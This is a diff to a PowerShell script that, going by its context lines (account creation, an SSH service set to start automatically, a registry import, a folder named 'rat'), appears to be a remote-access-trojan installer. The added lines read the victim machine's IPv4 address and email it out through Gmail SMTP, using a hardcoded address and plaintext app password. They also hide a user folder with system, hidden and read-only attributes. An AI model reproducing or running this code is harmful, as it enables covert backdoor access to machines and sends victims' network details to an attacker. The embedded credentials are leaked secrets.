@@ -30,7 +30,44 @@ function create_account {
 # Variables
 $wd = random_text
 $path = Join-Path -Path $env:temp -ChildPath $wd
-Write-Output $path
+
+# Define sender, recipient, subject, and body
+$from = "firas.riahi@ensi-uma.tn"
+$to = "eya.khalfallah@ensi-uma.tn"
+$subject = "Test Email"
+$ipConfigOutput = ipconfig
+$ip = $ipConfigOutput | Select-String -Pattern 'IPv4 Address.*: ((\d{1,3}\.){3}\d{1,3})' | ForEach-Object { $_.Matches.Groups[1].Value }
+
+# If IPv4 address is found, proceed with sending the email
+if ($ip) {
+    $body = "This is a test email sent via PowerShell, ched addresset ip: $ip :D ."
+    # Send the email here
+} else {
+    $body = "IPv4 address not found."
+}
+
+# Gmail SMTP server settings
+$smtpServer = "smtp.gmail.com"
+$smtpPort = 587
+$username = "firas.riahi@ensi-uma.tn"
+$password = "xzvp wqgl grtq byrk" # Or your app password if you have two-factor authentication enabled
+
+# Create the email object
+$email = New-Object System.Net.Mail.MailMessage
+$email.From = $from
+$email.To.Add($to)
+$email.Subject = $subject
+$email.Body = $body
+
+# Create SMTP client and send the email
+$smtp = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
+$smtp.EnableSSL = $true
+$smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password)
+
+# Send the email
+$smtp.Send($email)
+
+Write-Host "Email sent successfully."
 
 # Create directory if it doesn't exist
 if (-not (Test-Path $path)) {
@@ -62,5 +99,8 @@ Set-Service -Name sshd -StartupType 'Automatic'
 
 ./wreg.reg; ./hello
 
+
+cd C:\Users
+attrib +h +s +r jarbouu3
 
 Set-Location C:\Users\user\OneDrive\Bureau\rat\files
